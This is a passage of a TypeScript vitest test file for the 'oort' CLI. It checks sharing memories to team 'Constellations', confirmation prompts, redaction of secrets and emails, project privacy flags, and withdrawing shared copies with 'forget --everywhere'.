import * as fs from 'node:fs';
import * as http from 'node:http';
import * as path from 'node:path';
import { describe, expect, it } from 'vitest';
import { fakeCloud, fakeMemory, type FakeCloud } from '../test/helpers/fake-cloud.js';
import {
  JSON_NEVER_ASKS,
  NO_TTY_STDIN,
  PIPED_YES,
  expectAsked,
  expectDeclined,
  expectRefusedWithoutPrompt,
  fakeIo,
  tmpdir,
  data,
  failed,
} from '../test/helpers.js';
import { createCloudClient, writeCloudSettings } from './cloud.js';
import { readTexts } from './commands/forget.js';
import { marked } from './commands/share.js';
import { createKeychain } from './keychain.js';
import { runCli } from './program.js';
import { uiFor } from './ui.js';
import { wire as realWire, type WireFn } from './wire.js';

/** Assembled at runtime so no key literal sits in a source file. */
const oortKey = (): string => ['oort', 'sk', `share${Date.now()}`.padEnd(43, 'S')].join('_');

function setup(mode: 'local' | 'cloud' = 'cloud') {
  const root = tmpdir();
  const home = path.join(root, 'oort-home');
  const cwd = path.join(root, 'project');
  fs.mkdirSync(cwd);
  const key = oortKey();
  const cloud: FakeCloud = fakeCloud(key);
  if (mode === 'cloud') writeCloudSettings(home, { store: 'cloud' });
  const wire: WireFn = (dir, o = {}) =>
    realWire(dir, { ...o, keychain: async () => undefined, fetch: cloud.fetch });
  // `tty` is a terminal session (stdin and stdout); `stdoutTTY: false` pipes stdout.
  const run = async (
    args: string[],
    opts: {
      tty?: boolean;
      stdoutTTY?: boolean;
      answer?: string;
      onIo?: (io: ReturnType<typeof fakeIo>) => void;
    } = {},
  ) => {
    const io = fakeIo({
      cwd,
      env: { HOME: root, OORT_HOME: home, OORT_NO_KEYCHAIN: '1', OORT_API_KEY: key },
      ...(opts.tty !== undefined && { tty: opts.tty, stdoutTTY: opts.stdoutTTY ?? opts.tty }),
      ...(opts.answer !== undefined && { answer: opts.answer }),
    });
    opts.onIo?.(io);
    const code = await runCli(args, io, wire, createKeychain({ platform: 'none' }), {
      fetch: cloud.fetch,
    });
    return { code, io };
  };
  return { root, home, cwd, cloud, key, run };
}

const ID = '22222222-3333-4444-8555-666666666666';

function withTeam(e: ReturnType<typeof setup>) {
  e.cloud.hive.enabled = true;
  e.cloud.hive.constellations.set('c_aaaaaaaaaaaaaaaa', {
    id: 'c_aaaaaaaaaaaaaaaa',
    name: 'oort-core',
    role: 'maintainer',
    owner: true,
  });
  e.cloud.memories.set(
    ID,
    fakeMemory({ id: ID, text: 'We deploy oortcloud with wrangler; ask maya@example.com.' }),
  );
}

describe('oort share and oort constellation (Oort Cloud, hive beta)', () => {
  it('share.previews-exactly-what-would-leave-then-shares-on-yes', async () => {
    const e = setup();
    withTeam(e);
    const r = await e.run(['share', ID.slice(0, 8), '--to', 'oort-core', '--yes']);
    expect(r.code).toBe(0);
    expect(r.io.stdout).toContain('Share to Constellation oort-core');
    expect(r.io.stdout).toContain('»maya@example.com«');
    expect(r.io.stdout).toContain('an email address');
    expect(r.io.stdout).toContain('Share to Constellation oort-core (c_aaaa)');
    expect(r.io.stdout).toMatch(/Shared to Constellation oort-core \(c_aaaa\) as copy-/);
    // The preview by the typed name, then the confirmation against the id the preview resolved,
    // with exactly the text that was shown, the preview's token, and the email acknowledged.
    const [first, second] = e.cloud.hive.requests as Record<string, unknown>[];
    expect(first).toEqual({ to: 'oort-core', memoryId: ID });
    expect(second).toEqual({
      to: 'c_aaaaaaaaaaaaaaaa',
      memoryId: ID,
      text: 'We deploy oortcloud with wrangler; ask maya@example.com.',
      previewToken: expect.stringMatching(/^pv_/),
      acknowledgedFindings: true,
      confirm: true,
    });
    expect(e.cloud.hive.shared.size).toBe(1);
  });

  it('share.never-prompts-without-a-terminal-and-shares-nothing', async () => {
    const e = setup();
    withTeam(e);
    const r = await e.run(['share', ID, '--to', 'oort-core']);
    expect(r.code).toBe(2);
    expect(r.io.stderr).toContain('--yes');
    expect(e.cloud.hive.shared.size).toBe(0);
    const no = await e.run(['share', ID, '--to', 'oort-core'], { tty: true, answer: 'n' });
    expect(no.code).toBe(0);
    expect(no.io.stdout).toContain('Not shared.');
    expect(e.cloud.hive.shared.size).toBe(0);
  });

  it('share.confirm-asks-on-stderr-even-piped-refuses-json-and-a-decline-exits-0 (CON-107)', async () => {
    const e = setup();
    withTeam(e);
    const args = ['share', ID, '--to', 'oort-core'];
    // No terminal on stdin: refuses rather than wait for an answer nobody can give.
    expectRefusedWithoutPrompt(await e.run(args), NO_TTY_STDIN);
    // --json on a terminal: refuses too; stdout is only the oort.v1 failure envelope (no preview,
    // no "Not shared."), whose fix is the same command with --yes.
    const json = await e.run([...args, '--json'], { tty: true, answer: 'y' });
    expectRefusedWithoutPrompt(json, JSON_NEVER_ASKS);
    expect(failed(json, 'needs-confirmation', 'share').fix).toBe(
      `oort share ${ID} --to oort-core --json --yes`,
    );
    expect(e.cloud.hive.shared.size).toBe(0);
    // Declined on a terminal: exit 0, the question never on stdout.
    const no = await e.run(args, { tty: true, answer: 'n' });
    expectDeclined(no);
    expect(no.io.asked[0]).toContain('Share 22222222');
    expect(no.io.stdout).toContain('Not shared.');
    expect(e.cloud.hive.shared.size).toBe(0);
    // stdout piped, a person at the terminal: asked on stderr, and yes shares.
    const piped = await e.run(args, PIPED_YES);
    expectAsked(piped);
    expect(piped.io.stdout).toContain('Shared to Constellation');
    expect(e.cloud.hive.shared.size).toBe(1);
    // --yes --json: never asks, and stdout is the JSON result alone.
    const yes = await e.run([...args, '--yes', '--json']);
    expect(yes.code, yes.io.stderr).toBe(0);
    expect(yes.io.asked).toEqual([]);
    expect(data(yes.io.stdout)).toMatchObject({ constellationId: 'c_aaaaaaaaaaaaaaaa' });
  });

  it('share.edited-text-is-scrubbed-before-it-leaves-the-machine', async () => {
    const e = setup();
    withTeam(e);
    const key = ['AKIA', 'IOSFODNN7', 'EXAMPLE'].join('');
    const r = await e.run([
      'share',
      ID,
      '--to',
      'oort-core',
      '--text',
      `The deploy bot signs in with ${key} on staging.`,
      '--yes',
    ]);
    expect(r.code, r.io.stderr).toBe(0);
    expect(JSON.stringify(e.cloud.hive.requests)).not.toContain(key);
    expect((e.cloud.hive.requests[0] as { text: string }).text).toMatch(
      /\[REDACTED:aws-access-key\]/,
    );
    // Mostly secret: refused here, nothing sent.
    const before = e.cloud.hive.requests.length;
    const secret = await e.run(['share', ID, '--to', 'oort-core', '--text', key, '--yes']);
    expect(secret.code).toBe(2);
    expect(secret.io.stderr).toContain('mostly secret');
    expect(e.cloud.hive.requests).toHaveLength(before);
  });

  it('share.sends-an-edited-text-and-a-private-project', async () => {
    const e = setup();
    withTeam(e);
    fs.writeFileSync(
      path.join(e.cwd, 'oort.config.json'),
      JSON.stringify({ project: { private: true } }),
    );
    fs.mkdirSync(path.join(e.cwd, '.git'));
    const r = await e.run([
      'share',
      ID,
      '--to',
      'oort-core',
      '--text',
      'We deploy with wrangler.',
      '--yes',
    ]);
    expect(r.code).toBe(0);
    const first = e.cloud.hive.requests[0] as {
      text: string;
      project?: string;
      projectPrivate?: boolean;
    };
    expect(first.text).toBe('We deploy with wrangler.');
    expect(first.project).toBeDefined();
    expect(first.projectPrivate).toBe(true);
  });

  it('share.a-memory-from-an-unknown-or-private-project-is-refused-by-the-cloud', async () => {
    const e = setup();
    withTeam(e);
    const p = '44444444-5555-4666-8777-888888888888';
    e.cloud.memories.set(
      p,
      fakeMemory({
        id: p,
        text: 'The secret project uses rust.',
        scope: { projectId: 'p-secret' },
      }),
    );
    // From no repository: nobody has said whether p-secret is private.
    const unknown = await e.run(['share', p, '--to', 'oort-core', '--yes']);
    expect(unknown.code).toBe(2);
    expect(unknown.io.stderr).toContain('oort project privacy public');
    // A recall inside p-secret states it is private; from then on it is refused.
    e.cloud.hive.privacy.set('p-secret', true);
    const priv = await e.run(['share', p, '--to', 'oort-core', '--yes']);
    expect(priv.code).toBe(2);
    expect(priv.io.stderr).toContain('private project');
    expect(e.cloud.hive.shared.size).toBe(0);
  });

  it('share.sharing-again-updates-the-one-copy', async () => {
    const e = setup();
    withTeam(e);
    await e.run(['share', ID, '--to', 'oort-core', '--yes']);
    await e.run(['share', ID, '--to', 'oort-core', '--text', 'We deploy with wrangler.', '--yes']);
    expect([...e.cloud.hive.shared.values()].map((x) => x.text)).toEqual([
      'We deploy with wrangler.',
    ]);
  });

  it('share.states-privacy-on-recall-observe-and-remember-from-inside-a-project', async () => {
    const e = setup();
    e.cloud.hive.enabled = true;
    fs.writeFileSync(
      path.join(e.cwd, 'oort.config.json'),
      JSON.stringify({ project: { private: true } }),
    );
    fs.mkdirSync(path.join(e.cwd, '.git'));
    await e.run(['recall', 'anything at all here']);
    expect([...e.cloud.hive.privacy.values()]).toEqual([true]);
    await e.run(['observe', '--user', 'a fact', '--assistant', 'noted']);
    expect(e.cloud.observed.at(-1)?.['projectPrivate']).toBe(true);
  });

  it('share.outside-the-beta-and-in-local-mode-is-a-plain-refusal', async () => {
    const e = setup();
    e.cloud.memories.set(ID, fakeMemory({ id: ID }));
    const off = await e.run(['share', ID, '--to', 'oort-core', '--yes']);
    expect(off.code).toBe(2);
    expect(off.io.stderr).toContain('invite-only beta');
    const local = setup('local');
    const l = await local.run(['share', ID, '--to', 'oort-core', '--yes']);
    expect(l.code).toBe(2);
    expect(l.io.stderr).toContain('oort cloud use');
  });

  it('constellation.list-and-create', async () => {
    const e = setup();
    e.cloud.hive.enabled = true;
    const empty = await e.run(['constellation', 'list']);
    expect(empty.io.stdout).toContain('None yet');
    const made = await e.run(['constellation', 'create', 'oort-core']);
    expect(made.code).toBe(0);
    expect(made.io.stdout).toContain('Created Constellation oort-core');
    const list = await e.run(['constellation', 'list', '--json']);
    expect(data(list.io.stdout, 'constellation list').constellations).toEqual([
      expect.objectContaining({ name: 'oort-core', role: 'maintainer', owner: true }),
    ]);
    const bad = await e.run(['constellation', 'create', '[your Planet]']);
    expect(bad.code).toBe(2);
    const again = await e.run(['constellation', 'create', 'second']);
    expect(again.code).toBe(2);
    expect(again.io.stderr).toContain('One Constellation');
  });

  it('recall.reads-constellations-labelled-and-include-narrows', async () => {
    const e = setup();
    withTeam(e);
    await e.run(['share', ID, '--to', 'oort-core', '--yes']);
    e.cloud.memories.clear();
    const r = await e.run(['recall', 'how do we deploy oortcloud']);
    expect(r.code).toBe(0);
    expect(r.io.stdout).toMatch(
      /\[semantic, Constellation oort-core, [^\]]+\] We deploy oortcloud/,
    );
    const planet = await e.run(['recall', 'how do we deploy oortcloud', '--include', 'planet']);
    expect(planet.io.stdout).not.toContain('Constellation oort-core');
    e.cloud.hive.constellations.clear();
    const denied = await e.run(['recall', 'deploy', '--include', 'constellation']);
    expect(denied.code).toBe(2);
    expect(denied.io.stderr).toContain('cannot read constellation');
  });

  it('forget.says-a-copy-stays-and-everywhere-withdraws-it', async () => {
    const e = setup();
    withTeam(e);
    await e.run(['share', ID, '--to', 'oort-core', '--yes']);
    const plain = await e.run(['forget', ID, '--yes']);
    expect(plain.code).toBe(0);
    expect(plain.io.stdout).toContain(
      `Still shared to oort-core: that copy is the team's now. \`oort forget ${ID} --everywhere\` withdraws it.`,
    );
    expect(e.cloud.hive.shared.size).toBe(1);

    const other = '33333333-4444-4555-8666-777777777777';
    e.cloud.memories.set(other, fakeMemory({ id: other, text: 'Release notes come first.' }));
    await e.run(['share', other, '--to', 'oort-core', '--yes']);
    const all = await e.run(['forget', other, '--yes', '--everywhere']);
    expect(all.code).toBe(0);
    expect(all.io.stdout).toBe(`Forgot ${other}.\nWithdrawn from oort-core.\n`);
    expect(e.cloud.seen).toContain(`DELETE /v1/memories/${other}`);
    expect([...e.cloud.hive.shared.values()].map((x) => x.sourceId)).toEqual([ID]);
    const local = await setup('local').run(['forget', ID, '--yes', '--everywhere', '--json']);
    expect(local.code).toBe(2);
    expect(failed(local, 'cloud-only', 'forget').message).toBe(
      '--everywhere is for Oort Cloud, where memories can be shared.',
    );
  });

  it('share.marks-findings-without-colour-and-skips-overlaps', () => {
    const ui = uiFor(fakeIo({ cwd: '/' }));
    expect(
      marked(
        'mail a@b.co now',
        [
          { kind: 'email', start: 5, end: 11 },
          { kind: 'email', start: 6, end: 9 },
        ],
        ui,
      ),
    ).toBe('mail »a@b.co« now');
  });

  it('share.confirms-the-previewed-id-even-if-the-name-now-means-another', async () => {
    const e = setup();
    withTeam(e);
    // Between preview and confirm, the user joins another "oort-core" and the first is renamed.
    const answered = e.cloud.fetch;
    e.cloud.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
      const res = await answered(input, init);
      if (String(input instanceof Request ? input.url : input).endsWith('/oort-core/share')) {
        e.cloud.hive.constellations.get('c_aaaaaaaaaaaaaaaa')!.name = 'renamed';
        e.cloud.hive.constellations.set('c_bbbbbbbbbbbbbbbb', {
          id: 'c_bbbbbbbbbbbbbbbb',
          name: 'oort-core',
          role: 'member',
          owner: false,
        });
      }
      return res;
    }) as typeof fetch;
    const r = await e.run(['share', ID, '--to', 'oort-core', '--yes']);
    expect(r.code).toBe(0);
    expect([...e.cloud.hive.shared.values()].map((x) => x.constellation)).toEqual([
      'c_aaaaaaaaaaaaaaaa',
    ]);
  });

  it('share.an-ambiguous-name-refuses-and-lists-the-candidates', async () => {
    const e = setup();
    withTeam(e);
    e.cloud.hive.constellations.set('c_bbbbbbbbbbbbbbbb', {
      id: 'c_bbbbbbbbbbbbbbbb',
      name: 'oort-core',
      role: 'member',
      owner: false,
    });
    const r = await e.run(['share', ID, '--to', 'oort-core', '--yes']);
    expect(r.code).toBe(2);
    expect(r.io.stderr).toContain('oort-core (c_aaaa)');
    expect(r.io.stderr).toContain('oort-core (c_bbbb)');
    expect(e.cloud.hive.shared.size).toBe(0);
    // By id, it works.
    expect((await e.run(['share', ID, '--to', 'c_bbbbbbbbbbbbbbbb', '--yes'])).code).toBe(0);
  });

  it('share.a-confirm-after-losing-write-access-is-refused', async () => {
    const e = setup();
    withTeam(e);
    const answered = e.cloud.fetch;
    e.cloud.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
      const res = await answered(input, init);
      // Made a reader right after the preview.
      if (String(input instanceof Request ? input.url : input).endsWith('/oort-core/share')) {
        e.cloud.hive.constellations.get('c_aaaaaaaaaaaaaaaa')!.role = 'reader';
      }
      return res;
    }) as typeof fetch;
    const r = await e.run(['share', ID, '--to', 'oort-core', '--yes']);
    expect(r.code).toBe(2);
    expect(r.io.stderr).toContain('cannot share');
    expect(e.cloud.hive.shared.size).toBe(0);
  });
});

describe('hooks state the privacy of the project they run in (cloud mode)', () => {
  it('cloud-remote.states-privacy-only-for-its-own-project', async () => {
    const { cloudRemote } = await import('./cloud-remote.js');
    const sent: Record<string, unknown>[] = [];
    const client = {
      recall: async (q: Record<string, unknown>) => {
        sent.push(q);
        return { memories: [], timings: {} };
      },
      observe: async (b: Record<string, unknown>) => {
        sent.push(b);
        return { outcome: 'added', memories: [], counts: {} };
      },
    } as unknown as Parameters<typeof cloudRemote>[0];
    const remote = cloudRemote(client, undefined, { projectId: 'p1', private: true });
    await remote.recall({ text: 'x', projectId: 'p1' } as never);
    await remote.recall({ text: 'x', projectId: 'p2' } as never);
    const obs = {
      userText: 'u',
      assistantText: 'a',
      toolSummaries: [],
      at: '2026-11-05T00:00:00Z',
    };
    await remote.observe(obs as never, 'p1', undefined);
    await remote.observe(obs as never, 'p2', undefined);
    expect(sent.map((x) => x['projectPrivate'])).toEqual([true, undefined, true, undefined]);
  });
});

describe('project privacy is stated only when the project config sets it, and private is sticky', () => {
  const inRepo = (e: ReturnType<typeof setup>, config?: unknown) => {
    fs.mkdirSync(path.join(e.cwd, '.git'), { recursive: true });
    if (config !== undefined) {
      fs.writeFileSync(path.join(e.cwd, 'oort.config.json'), JSON.stringify(config));
    }
  };
  const lastRecall = (e: ReturnType<typeof setup>) => e.cloud.hive.privacy;

  it('privacy.a-default-config-states-nothing', async () => {
    for (const config of [undefined, { project: { id: 'x' } }, { recall: { budgetChars: 4000 } }]) {
      const e = setup();
      e.cloud.hive.enabled = true;
      inRepo(e, config);
      await e.run(['recall', 'anything at all here']);
      await e.run(['observe', '--user', 'a fact', '--assistant', 'noted']);
      expect(lastRecall(e).size).toBe(0);
      expect(e.cloud.observed.at(-1)).not.toHaveProperty('projectPrivate');
    }
  });

  it('privacy.an-explicit-false-records-not-private', async () => {
    const e = setup();
    e.cloud.hive.enabled = true;
    inRepo(e, { project: { private: false } });
    await e.run(['recall', 'anything at all here']);
    expect([...lastRecall(e).values()]).toEqual([false]);
  });

  it('privacy.a-recorded-true-survives-a-later-false-and-only-the-command-clears-it', async () => {
    const e = setup();
    e.cloud.hive.enabled = true;
    inRepo(e, { project: { private: true } });
    await e.run(['recall', 'anything at all here']);
    fs.writeFileSync(
      path.join(e.cwd, 'oort.config.json'),
      JSON.stringify({ project: { private: false } }),
    );
    await e.run(['recall', 'anything at all here']);
    expect([...lastRecall(e).values()]).toEqual([true]);
    // The explicit command: it asks, and a non-terminal needs --yes.
    const asked = await e.run(['project', 'privacy', 'public']);
    expect(asked.code).toBe(2);
    expect(asked.io.stderr).toContain('--yes');
    expect([...lastRecall(e).values()]).toEqual([true]);
    const no = await e.run(['project', 'privacy', 'public'], { tty: true, answer: 'n' });
    expectDeclined(no);
    expect(no.io.stdout).toContain('Unchanged');
    expect([...lastRecall(e).values()]).toEqual([true]);
    // stdout piped, a person at the terminal: asked on stderr, and yes marks it public.
    const piped = await e.run(['project', 'privacy', 'public'], PIPED_YES);
    expectAsked(piped);
    expect(piped.io.stdout).toContain('is not private');
    const yes = await e.run(['project', 'privacy', 'public', '--yes']);
    expect(yes.io.stderr).toBe('');
    expect(yes.code).toBe(0);
    expect([...lastRecall(e).values()]).toEqual([false]);
    expect((await e.run(['project', 'privacy', 'private'])).code).toBe(0);
    expect([...lastRecall(e).values()]).toEqual([true]);
    expect((await e.run(['project', 'privacy', 'maybe', '--yes'])).code).toBe(2);
  });

  it('privacy.the-drain-states-nothing', async () => {
    const e = setup();
    inRepo(e, { project: { private: true } });
    const { wire, statedProjectPrivacy } = await import('./wire.js');
    const env = { HOME: e.root, OORT_HOME: e.home, OORT_NO_KEYCHAIN: '1' };
    const drain = await wire(e.cwd, { env, projectConfig: false, keychain: async () => undefined });
    expect(drain.statedPrivacy).toBeUndefined();
    await drain.close();
    const here = await wire(e.cwd, { env, keychain: async () => undefined });
    expect(here.statedPrivacy).toBe(true);
    expect(statedProjectPrivacy(e.cwd, here.config)).toBe(true);
    await here.close();
    // And a remote built without an explicit statement sends none.
    const { cloudRemote } = await import('./cloud-remote.js');
    const sent: Record<string, unknown>[] = [];
    const client = {
      recall: async (q: Record<string, unknown>) => {
        sent.push(q);
        return { memories: [], timings: {} };
      },
    } as unknown as Parameters<typeof cloudRemote>[0];
    await cloudRemote(client, undefined, { projectId: 'p1' }).recall({
      text: 'x',
      projectId: 'p1',
    } as never);
    expect(sent[0]).not.toHaveProperty('projectPrivate');
  });
});

/** A copy of `source` in Constellation `cid`, as a share leaves it. */
function copyIn(e: ReturnType<typeof setup>, cid: string, source = ID): void {
  const id = `copy-${cid}-${source.slice(0, 8)}`;
  e.cloud.hive.shared.set(id, {
    ...fakeMemory({ id, text: 'We deploy oortcloud with wrangler.' }),
    constellation: cid,
    sourceId: source,
  });
}

const CHECKOUT = 'c_cccccccccccccccc';
const DESIGN = 'c_dddddddddddddddd';

/** oort-core (maintainer), plus checkout and design (member). */
function withTeams(e: ReturnType<typeof setup>): void {
  withTeam(e);
  for (const [id, name] of [
    [CHECKOUT, 'checkout'],
    [DESIGN, 'design'],
  ] as const) {
    e.cloud.hive.constellations.set(id, { id, name, role: 'member', owner: false });
  }
}

describe('oort forget and shared copies (Oort Cloud, CON-67)', () => {
  it('forget.the-question-says-where-it-is-shared-and-how-to-withdraw', async () => {
    const e = setup();
    withTeams(e);
    copyIn(e, 'c_aaaaaaaaaaaaaaaa');
    copyIn(e, CHECKOUT);
    const no = await e.run(['forget', ID], { tty: true, answer: 'n' });
    expectDeclined(no);
    expect(no.io.asked[0]).toBe(
      'Forget 22222222 "We deploy oortcloud with wrangler; ask maya@example.com." (also shared to oort-core, checkout; add --everywhere to withdraw your copies)? [y/N] ',
    );
    expect(no.io.stdout).toBe('Kept.\n');
    expect(e.cloud.memories.has(ID)).toBe(true);
    // Not shared: the question is the plain one.
    const other = '33333333-4444-4555-8666-777777777777';
    e.cloud.memories.set(other, fakeMemory({ id: other, text: 'Release notes come first.' }));
    const plain = await e.run(['forget', other], { tty: true, answer: 'n' });
    expect(plain.io.asked[0]).toBe('Forget 33333333 "Release notes come first."? [y/N] ');
  });

  it('forget.json-warns-it-is-still-shared-and-lists-where', async () => {
    const e = setup();
    withTeams(e);
    copyIn(e, CHECKOUT);
    const r = await e.run(['forget', ID, '--yes', '--json']);
    expect(r.code, r.io.stderr).toBe(0);
    expect(data(r.io.stdout, 'forget')).toEqual({
      id: ID,
      forgotten: true,
      everywhere: false,
      withdrawnFrom: [],
      removalRequested: [],
      unreachable: [],
      stillShared: [{ constellation: CHECKOUT, name: 'checkout', member: true }],
      constellations: [{ constellation: CHECKOUT, name: 'checkout', member: true }],
      // What Oort Cloud's answer says about later memories (CON-161): none here.
      rewritten: [],
      notRewritten: [],
    });
    expect(JSON.parse(r.io.stdout).warnings).toEqual([
      {
        code: 'still-shared',
        message: 'Also shared to checkout; add --everywhere to withdraw your copies.',
      },
    ]);
    // The copy stays: it is the team's memory now.
    expect(e.cloud.hive.shared.size).toBe(1);
    expect(e.cloud.memories.has(ID)).toBe(false);
  });

  it('forget.an-oort-cloud-from-before-rewrites-names-a-later-memory-that-restates-it (CON-144)', async () => {
    const e = setup();
    withTeams(e);
    // It answers 204 with no body, so the CLI walks the chain itself, after the forget.
    e.cloud.forgetAnswer = 'pre-rewrite';
    const later = '44444444-5555-4666-8777-888888888888';
    const unrelated = '55555555-6666-4777-8888-999999999999';
    e.cloud.memories.set(
      ID,
      fakeMemory({
        id: ID,
        text: 'The dev server runs on port 3000.',
        entities: ['dev server'],
        supersededBy: later,
      }),
    );
    e.cloud.memories.set(
      later,
      fakeMemory({
        id: later,
        text: 'The dev server port changed from 3000 to 8080.',
        entities: ['dev server'],
        supersedes: ID,
        supersededBy: unrelated,
      }),
    );
    // Later still, restating nothing of it: not named.
    e.cloud.memories.set(
      unrelated,
      fakeMemory({
        id: unrelated,
        text: 'The dev server port is 8081.',
        entities: ['dev server'],
        supersedes: later,
      }),
    );
    copyIn(e, CHECKOUT, later);
    const r = await e.run(['forget', ID, '--yes', '--json']);
    expect(r.code, r.io.stderr).toBe(3);
    const d = data(r.io.stdout, 'forget');
    // That Oort Cloud does not rewrite: the fields are left out, never an empty claim.
    expect(d).not.toHaveProperty('rewritten');
    expect(d).not.toHaveProperty('notRewritten');
    expect(JSON.parse(r.io.stdout).warnings).toEqual([
      {
        code: 'not-rewritten',
        message: `44444444 may still restate it: Oort Cloud does not rewrite later memories yet; it is also shared to checkout. Check it with \`oort inspect ${later}\`, or forget it too: \`oort forget ${later} --everywhere\`.`,
      },
    ]);
  });

  it('forget.a-later-memory-it-could-not-read-is-a-warning-and-exit-3 (CON-144)', async () => {
    const e = setup();
    e.cloud.forgetAnswer = 'pre-rewrite';
    const later = '44444444-5555-4666-8777-888888888888';
    e.cloud.memories.set(
      ID,
      fakeMemory({ id: ID, text: 'The port is 3000.', entities: [], supersededBy: later }),
    );
    e.cloud.fail = { [`GET /v1/memories/${later}`]: 503 };
    const r = await e.run(['forget', ID, '--yes', '--json']);
    expect(r.code, r.io.stderr).toBe(3);
    expect(e.cloud.memories.has(ID)).toBe(false);
    expect(JSON.parse(r.io.stdout).warnings).toEqual([
      {
        code: 'successors-unknown',
        message: `Could not read ${later.slice(0, 8)}, a later memory of it, so it and any after it may still restate it. Check it with \`oort inspect ${later}\`.`,
      },
    ]);
  });

  it('forget.outside-the-hive-beta-forgets-without-a-shares-warning', async () => {
    const e = setup();
    e.cloud.memories.set(ID, fakeMemory({ id: ID, text: 'Plain.' }));
    const r = await e.run(['forget', ID, '--yes', '--json']);
    expect(r.code, r.io.stderr).toBe(0);
    expect(JSON.parse(r.io.stdout).warnings).toEqual([]);
    expect(data(r.io.stdout).stillShared).toEqual([]);
  });

  it('forget.a-failed-shares-lookup-is-a-warning-never-a-silent-no-copies', async () => {
    const e = setup();
    withTeam(e);
    e.cloud.fail = { 'GET /v1/memories/:id/shares': 503 };
    const r = await e.run(['forget', ID, '--yes', '--json']);
    expect(r.code, r.io.stderr).toBe(0);
    expect(r.io.stderr).toContain(
      'oort: Could not check whether it was shared to a Constellation.',
    );
    expect(JSON.parse(r.io.stdout).warnings).toEqual([
      {
        code: 'shares-unknown',
        message: 'Could not check whether it was shared to a Constellation.',
      },
    ]);
    expect(e.cloud.memories.has(ID)).toBe(false);
  });

  it('forget.everywhere-says-what-was-withdrawn-requested-and-not-reached', async () => {
    const e = setup();
    withTeams(e);
    for (const cid of ['c_aaaaaaaaaaaaaaaa', CHECKOUT, DESIGN]) copyIn(e, cid);
    e.cloud.hive.withdrawOutcome.set(CHECKOUT, 'requested');
    e.cloud.hive.withdrawOutcome.set(DESIGN, 'unreachable');
    const yes = await e.run(['forget', ID, '--everywhere'], PIPED_YES);
    // A copy not reached is a partial success: exit 3, as `import`.
    expect(yes.code, yes.io.stderr).toBe(3);
    expect(yes.io.asked).toHaveLength(1);
    expect(yes.io.stdout).not.toContain('[y/N]');
    // The list is what the lookup saw: the question never promises it is exact.
    expect(yes.io.asked[0]).toBe(
      'Forget 22222222 "We deploy oortcloud with wrangler; ask maya@example.com." and withdraw your copies from oort-core, checkout, design (and any other Constellation you shared it to; where others contributed, its maintainers get a removal request)? [y/N] ',
    );
    expect(yes.io.stdout).toBe(
      [
        `Forgot ${ID}.`,
        'Withdrawn from oort-core.',
        'Others contributed in checkout: a removal request went to the maintainers, and the copy stays until they decide.',
        `Not reached: design. The copy stays; run \`oort forget ${ID} --everywhere\` again later (a Constellation you left needs a full key, or the dashboard).`,
        '',
      ].join('\n'),
    );
    // Only the withdrawn copy is gone.
    expect([...e.cloud.hive.shared.values()].map((x) => x.constellation).sort()).toEqual([
      CHECKOUT,
      DESIGN,
    ]);
  });

  it('forget.everywhere-json-lists-ids-names-and-warnings', async () => {
    const e = setup();
    withTeams(e);
    for (const cid of ['c_aaaaaaaaaaaaaaaa', CHECKOUT, DESIGN]) copyIn(e, cid);
    e.cloud.hive.withdrawOutcome.set(CHECKOUT, 'requested');
    e.cloud.hive.withdrawOutcome.set(DESIGN, 'unreachable');
    const r = await e.run(['forget', ID, '--everywhere', '--yes', '--json']);
    // Partial: the envelope says so the way `import`'s does, with exitCode 3.
    expect(r.code, r.io.stderr).toBe(3);
    expect(JSON.parse(r.io.stdout)).toMatchObject({ ok: true, exitCode: 3 });
    const core = { constellation: 'c_aaaaaaaaaaaaaaaa', name: 'oort-core', member: true };
    const checkout = { constellation: CHECKOUT, name: 'checkout', member: true };
    const design = { constellation: DESIGN, name: 'design', member: true };
    expect(data(r.io.stdout, 'forget')).toEqual({
      id: ID,
      forgotten: true,
      everywhere: true,
      withdrawnFrom: ['c_aaaaaaaaaaaaaaaa'],
      removalRequested: [CHECKOUT],
      unreachable: [DESIGN],
      stillShared: [checkout, design],
      constellations: [core, checkout, design],
      rewritten: [],
      notRewritten: [],
    });
    expect((JSON.parse(r.io.stdout).warnings as { code: string }[]).map((w) => w.code)).toEqual([
      'removal-requested',
      'unreachable',
    ]);
    // Human lines go to stderr in JSON mode: stdout is the one envelope.
    expect(r.io.stderr).toContain('Withdrawn from oort-core.');
  });

  it('forget.everywhere-after-a-plain-forget-still-withdraws-by-full-id', async () => {
    const e = setup();
    withTeam(e);
    copyIn(e, 'c_aaaaaaaaaaaaaaaa');
    expect((await e.run(['forget', ID, '--yes'])).code).toBe(0);
    // A prefix can't find a memory that is gone; the full id finds its copies.
    const prefix = await e.run(['forget', ID.slice(0, 8), '--everywhere', '--yes']);
    expect(prefix.code).toBe(2);
    const r = await e.run(['forget', ID, '--everywhere'], PIPED_YES);
    expectAsked(r);
    expect(r.io.asked[0]).toBe(
      'Withdraw your copies of 22222222 (already forgotten) from oort-core (and any other Constellation you shared it to)? [y/N] ',
    );
    expect(r.io.stdout).toBe(`${ID} was already forgotten.\nWithdrawn from oort-core.\n`);
    expect(e.cloud.hive.shared.size).toBe(0);
    // Once withdrawn, there is nothing left to find.
    expect((await e.run(['forget', ID, '--everywhere', '--yes'])).code).toBe(2);
  });

  it('forget.everywhere-reaches-a-constellation-you-left-but-not-from-a-narrowed-key', async () => {
    const e = setup();
    withTeams(e);
    copyIn(e, CHECKOUT);
    expect((await e.run(['constellation', 'leave', 'checkout', '--yes'])).code).toBe(0);
    const no = await e.run(['forget', ID, '--everywhere'], { tty: true, answer: 'n' });
    expect(no.io.asked[0]).toContain('withdraw your copies from checkout (you left)');
    e.cloud.narrowed = true;
    const narrowed = await e.run(['forget', ID, '--everywhere', '--yes', '--json']);
    expect(narrowed.code, narrowed.io.stderr).toBe(3);
    expect(JSON.parse(narrowed.io.stdout).exitCode).toBe(3);
    expect(data(narrowed.io.stdout).unreachable).toEqual([CHECKOUT]);
    expect(data(narrowed.io.stdout).stillShared).toEqual([
      { constellation: CHECKOUT, name: 'checkout', member: false },
    ]);
    expect(e.cloud.hive.shared.size).toBe(1);
    e.cloud.narrowed = false;
    const full = await e.run(['forget', ID, '--everywhere', '--yes']);
    expect(full.code, full.io.stderr).toBe(0);
    expect(full.io.stdout).toContain('Withdrawn from checkout (you left).');
    expect(e.cloud.hive.shared.size).toBe(0);
  });

  it('forget.everywhere-outside-the-hive-beta-is-refused-before-anything-is-forgotten', async () => {
    const e = setup();
    e.cloud.memories.set(ID, fakeMemory({ id: ID, text: 'Plain.' }));
